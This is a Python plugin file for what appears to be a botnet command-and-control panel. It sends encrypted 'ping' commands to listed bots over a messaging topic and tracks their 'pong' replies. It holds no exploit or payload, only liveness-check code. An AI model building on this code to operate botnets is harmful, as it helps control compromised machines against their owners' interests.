# plugins/ping.py
from .base_plugin import BasePlugin
import ujson as json
import time

class PingPlugin(BasePlugin):
    def __init__(self, parent):
        super().__init__(parent)
        self.name = "Ping"
        self.menu_action = self.name
        self.priority = 0
        self.category = "Bot"
        self.pending_bots = {}

    def execute(self, target):
        try:
            if target == 'all':
                for row in range(self.parent.device_table.rowCount()):
                    bot_id = self.parent.device_table.item(row, 5).text()
                    ip = self.parent.device_table.item(row, 0).text()
                    bot_target = f"{ip}:{bot_id}"
                    self.send_ping(bot_target)
            else:
                self.send_ping(target)
        except Exception as e:
            self.parent.log_area.append(f"Error executing ping: {e}")

    def send_ping(self, target):
        try:
            self.pending_bots[target] = False
            command = {'type': 'command', 'target': target, 'action': 'ping'}
            message = json.dumps(command)
            encrypted_message = self.parent.encrypt_message(message)
            self.parent.client.publish(self.parent.topic, encrypted_message)
            self.parent.log_area.append(f"Sent encrypted ping command: {command}")
        except Exception as e:
            self.parent.log_area.append(f"Error sending ping to {target}: {e}")

    def handle_response(self, data):
        try:
            if data.get('type') == 'pong':
                target = f"{data.get('ip')}:{data.get('id')}"
                if target in self.pending_bots:
                    self.pending_bots[target] = True
                    self.parent.log_area.append(f"Received pong from {target}")
        except Exception as e:
            self.parent.log_area.append(f"Error handling pong response: {e}")